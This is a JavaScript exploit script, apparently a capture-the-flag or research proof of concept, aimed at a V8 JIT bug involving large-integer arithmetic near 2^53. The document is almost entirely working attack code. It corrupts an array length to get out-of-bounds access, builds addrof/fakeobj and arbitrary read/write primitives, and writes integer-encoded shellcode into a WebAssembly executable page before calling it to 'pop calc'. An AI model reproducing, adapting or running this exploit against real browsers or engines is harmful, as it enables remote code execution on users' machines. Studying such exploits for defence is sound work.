var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new BigUint64Array(buf);

function f2i(val) {
	f64_buf[0] = val;
	return u64_buf[0];
}

function i2f(val) {
	u64_buf[0] = BigInt(val);
	return f64_buf[0];
}

let hexp = (i) => {
  print("0x" + (i).toString(16).padStart(16,"0"));
}

let MAGIC = 1.1;
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;
var shellcode = [1220018433, 16843009, 16863304, 3090053474, 1617781249, 21508356, 608745519, 1970500143, 1651076688, 1216997224, 993067265, 2167677953, 16843080, 3091482963, 1347174745, 1028665810, 1382680666, 1208083026, 1216995946, 33426468, 838227562, 140396545, 3864414345, 3865721688, 252022928];
function opt_me(bruh) {
	let arr = [MAGIC, MAGIC, MAGIC];
	// This is not gonna work
	//let arr2 = new Array(1.2, 1.2);
	let arr2 = Array.of(1.2);
	let ab = new ArrayBuffer(1025);
	let dv = new DataView(ab);
	fake_arr = [0x1336, {a: 0x41414141}, 0x1337];

	victim_idx = -1;

	let c = bruh ? 9007199254740992 : 9007199254740988;
	let z = c + 1 + 1 + 1;
	// 9007199254740992 + 1 + 1 : 9007199254740988 + 1 + 1
	// reduced to: 9007199254740992 + 2 : 9007199254740988 + 2
	// correct: 9007199254740992 : 9007199254740990
	// incorrect: 9007199254740994 : 9007199254740990
	z = z - 9007199254740990;

	let leak = arr[z];
	// Change arr2 JSArray length to 0x400
	// Prepare for fakeobj and abitrary read/write
	arr[z] = i2f(0x0000040000000000);

	if (leak != MAGIC) {
		if (arr2.length != 0x400) {
			print("[-] Could not corrupt arr2 length for OOB");
			return 0;
		}

		print("[+] Overwritten arr2 length")

		let victim_idx = arr2.indexOf(i2f(0x133600000000));

		if (victim_idx == -1 || f2i(arr2[victim_idx + 2]) != 0x133700000000) {
			print("[-] Could not locate fake object array after arr2");
			return 0;
		}

		print("[+] Located victim object in array");

		victim_idx += 1;

		function addrof(obj) {
			fake_arr[1] = obj;
			return f2i(arr2[victim_idx]);
		}

		function fakeobj(addr) {
			arr2[victim_idx] = i2f(addr);
			return fake_arr[1];
		}

		// Arbitrary read/write by changing ArrayBuffer backing_store pointer

		let ab_backing_idx = arr2.indexOf(i2f(0x401));

		if (ab_backing_idx == -1) {
			print("[-] Failed to located backing store index");
			return 0;
		}

		ab_backing_idx += 1;
		print("[+] Located backing store index");

		function readme(addr) {
			arr2[ab_backing_idx] = i2f(addr);
			return dv.getBigUint64(0, true);
		}

		function writeme(addr, val) {
			arr2[ab_backing_idx] = i2f(addr);
			dv.setUint32(0, val);
		}

		function copy_shellcode(addr, shellcode) {
			for (var i = 0; i < shellcode.length; i++) {
				writeme(addr + BigInt(4 * i), shellcode[i]);
			}
		}

		let wasm_addr = addrof(wasmInstance);
		let rwx_addr = readme(wasm_addr + 0xf8n - 1n);
		//hexp(rwx_addr);
		//%DebugPrint(wasmInstance);
		copy_shellcode(rwx_addr,  shellcode);
		print("[+] Shellcode copied");
		//Gonna SIGSEV here
		//dv.getUint32(0);

		//readline();
		print("[+] Popping calc");
		func();
	}
}

opt_me(false);
//%OptimizeFunctionOnNextCall(opt_me);
for (var _ = 0; _ < 0x10000; _++) {
	opt_me(false);
}
opt_me(true);
